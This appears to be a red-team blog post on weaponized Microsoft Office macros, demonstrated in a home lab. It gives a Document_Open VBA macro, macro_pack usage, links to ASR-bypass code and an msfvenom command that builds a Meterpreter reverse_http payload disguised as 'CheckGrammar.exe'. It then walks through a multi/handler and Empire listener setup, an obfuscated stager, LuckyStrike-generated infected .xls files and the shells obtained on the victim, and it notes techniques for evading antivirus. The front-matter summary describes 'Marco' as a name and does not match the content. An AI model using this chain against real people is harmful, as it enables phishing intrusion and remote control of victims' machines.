---
title: "Marco"
date: 2025-08-20
draft: false
summary: "Exploring Marco — a blend of simplicity and precision in the digital realm."
description: "Marco is more than just a name — it represents clarity, focus, and the art of navigating complex systems with elegance. This post dives into its meaning, applications, and lessons it brings."
tags: ["redteam", "phishing", "office365", "C2"]
layoutBackgroundBlur: true
showAuthor: true
---

## Wrap arround

### Execl 
<p align="center">
    <img src="img/1_calc.png" />
</p>

### MS Word
```
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("calc.exe", vbHide)
End Sub
```
<p align="center">
    <img src="img/2_1_calc.png" />
    ALT + F11 
    <img src="img/2_2_calc.png"/>
    Save as .dotm
    <img src="img/2_3_calc.png"/>
    Enable Content
</p>

### ASR (Attack surface reduction)

[Attack surface reduction rules overview](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#attack-surface-reduction-rules)

[Attack surface reduction rules reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)

Introduced as part of Windows Defender Exploit Guard in Windows 10 1709.

A set of rules
- Group Policy Objects

Some very efficient
- Ex. Block all Office Applications from creating child processes.
- Potential to block 99.9% of all marco based attacks in the wild.

<p align="center">
    <img src="img/2_4_asr.png" />
    <img src="img/2_5_asr_event.png" />
</p>

### ASR bypass

[ASR Rules Bypass.vba](https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3)

[Windows Defender Exploit Guard ASR VBScript/JS Rule](https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule)

[Windows Defender Exploit Guard ASR Rules for Office](https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office)

## Generate-Macro

Tested on Windows 10 with O365 Home Premium (M365).  

During execution, the payload was detected and terminated quickly by built-in antivirus/defender.  

(Correct me if I’m wrong or if you’ve observed different behavior.)  

## marco_pack

Using tool [macro_pack/community](https://github.com/sevagas/macro_pack), more detail at blog [EXCEL 4.0 XLM macro in MacroPack Pro](https://blog.sevagas.com/?EXCEL-4-0-XLM-macro-in-MacroPack-Pro)

**Example**
`echo "cmd.exe /c notepad.exe" | macro_pack.exe -o -t CMD -G test.xls`

<p align="center">
    <img src="img/3_notepad.png" />
    <img src="img/3_1_notepad.png" />
</p>

Some security bypass features:
- Some Anti Reverse
    - Sandbox detection
    - Hiding macro sheet
    - Obfuscation
- XLM InjectionXLM Injection

`
This is the community edition.
The Pro version unlocks advanced features such as shellcode injection, seamless Meterpreter integration, and extended exploitation capabilities.....
`

## Lucky Strike + Powershell Empire

**Attacker IP (Kali):** `192.168.50.2`

**Victim IP (Windows 10):** `192.168.50.3`

**In this section, I would use both meterpreter and empire**

### Malicious Server Deployment

#### Meterpreter

```$ msfvenom -p windows/meterpreter/reverse_http LPORT=8080 LHOST=192.168.50.2 -f exe -o CheckGrammar.exe ```

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 192.168.50.2
LHOST => 192.168.50.2
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run
[*] Started HTTP reverse handler on http://192.168.50.2:8080
```

#### Empire

I use Kali, so this is easy to install [empire-starkiller](https://www.kali.org/blog/empire-starkiller/)

After that, run with

```
sudo powershell-empire server
```

<p align="center">
    <img src="img/luckystrike/1_Starkiller.png"/>
</p>

*Default admin account*

**Username:** `empireadmin`

**Password:** `password123`

##### Create Listener

<p align="center">
    <img src="img/luckystrike/2_CreateListener.png"/>
    <img src="img/luckystrike/2_CreateListenerHttp.png"/>
</p>

##### Create Stager

<p align="center">
    <img src="img/luckystrike/3_CreateStager.png"/>
    Create new stager
    <img src="img/luckystrike/3_CreateStagerHttpListen.png"/>
    Set listener to http that just created in the previous step
    <img src="img/luckystrike/3_CreateStagerHttpObfuscate.png"/>
    Enable Obfuscate mode
    <img src="img/luckystrike/3_CreateStagerHttpDownload.png"/>
    Download this payload
</p>

### LuckyStrike

Transfer file to vicim machine, there are multiples ways to do this, but I interested in using http server

`python -m http.server 8000`

<p align="center">
    <img src="img/luckystrike/4_Download.png"/>
</p>

#### Prepare environment

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

<p align="center">
    <img src="img/luckystrike/4_Invoke-Obfuscation.png"/>
    Import module Invoke-Obfuscation
    <img src="img/luckystrike/4_Install_luckystrike.png"/>
    Install luckystrike
    <img src="img/luckystrike/4_Run_Invoke-Obfuscation.png"/>
    Invoke-Obfuscation
    <img src="img/luckystrike/4_luckystrike_error.png"/>
    Error in finding module
    <img src="img/luckystrike/4_luckystrike_fix_env.png"/>
    Find PSModulePath
    <img src="img/luckystrike/4_luckystrike_fix_modules.png"/>
    Copy / Move Invoke-Obfuscation folder to one of these paths
    <img src="img/luckystrike/4_luckystrike_init_successfully.png"/>
</p>

#### Create .xls

##### Meterpreter

<p align="center">
    <img src="img/luckystrike/5_meterpreter_create_payload.png"/>
    Create payload from malicious exe for reverse http (meterpreter)
    <img src="img/luckystrike/5_meterpreter_configure_payload.png"/>
    Configure payload
    <img src="img/luckystrike/5_meterpreter_create_xls.png"/>
    Generate file .xls
</p>

##### Empire

<p align="center">
    <img src="img/luckystrike/5_empire_create_payload.png"/>
    Create payload from malicious exe for reverse http (empire)
    <img src="img/luckystrike/5_empire_configure_payload.png"/>
    Configure payload
    <img src="img/luckystrike/5_empire_create_xls.png"/>
    Generate file .xls
</p>

### Open .xls

#### infected_fNKLTJYV.xls (meterpreter)

<p>
    <img src="img/luckystrike/6_meterpreter_open.png"/>
    Clink enable marco
    <img src="img/luckystrike/6_meterpreter_shell.png"/>
    Get shell
</p>

#### infected_fNKLTJYV.xls (empire)

<p>
    <img src="img/luckystrike/6_empire_open.png"/>
    Open file
    <img src="img/luckystrike/6_empire_agent_add.png"/>
    Add agent
    <img src="img/luckystrike/6_empire_agen_shell.png"/>
    Terminal
    <img src="img/luckystrike/6_empire_agent_file_browser.png"/>
    File Browser
</p>

## Attack Rating
- **High Realism**: Macro-based attacks continue to appear in real-world incidents, targeting both IT and non-IT staff.  
- **Social Engineering Factor**: Success often relies on persuading the user to click *Enable Content*, a surprisingly common behavior in corporate environments.  
- **Critical Risk**: If macros are enabled by default (or policies are poorly enforced), the attack vector becomes a severe vulnerability.  
- **Bypassing Defenses**: With obfuscation, sandbox detection, and sheet-hiding techniques, many traditional antivirus solutions can be evaded. Advanced variants also bypass some EDR tools by injecting into trusted processes.  
- **Persistence & Payload Delivery**: Weaponized macros can be chained to download and execute secondary payloads (e.g., Meterpreter, Cobalt Strike), establishing long-term access.  
- **Detection Difficulty**: When combined with living-off-the-land techniques (e.g., abusing PowerShell or WMI), attribution and detection become harder for defenders.  

## Tools 

[macro_pack](https://github.com/sevagas/macro_pack)

[Generate-Macro](https://github.com/enigma0x3/Generate-Macro)

[ASR Rules Bypass.vba](https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3)

[luckystrike](https://github.com/curi0usJack/luckystrike)

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

## References

[Attack surface reduction rules overview](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction#attack-surface-reduction-rules)

[Attack surface reduction rules reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)

[Phishing with MS Office](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office)

[EXCEL 4.0 XLM macro in MacroPack Pro](https://blog.sevagas.com/?EXCEL-4-0-XLM-macro-in-MacroPack-Pro)

[A guide to creating malicious macro-enabled Excel worksheets](https://wiki.hacksoc.co.uk/help-guides/techniques/a-guide-to-creating-malicious-macro-enabled-excel-worksheets)

[Maldocs: Tips for Red Teamers w/ Didier Stevens - SANS HackFest & Ranges Summit 2020](https://www.youtube.com/watch?v=zYWyPZDndVg)

[Uncompromised: Unpacking a malicious Excel macro](https://redcanary.com/blog/incident-response/malicious-excel-macro/)

[Testing initial access with "Generate-Macro" in Atomic Red Team](https://redcanary.com/blog/testing-and-validation/atomic-red-team/testing-initial-access-with-generate-macro-in-atomic-red-team/)

[Windows Red Team Exploitation Techniques | Luckystrike & PowerShell Empire](https://www.youtube.com/watch?v=dRebw65X5eQ)

[Windows Defender Exploit Guard ASR VBScript/JS Rule](https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule)
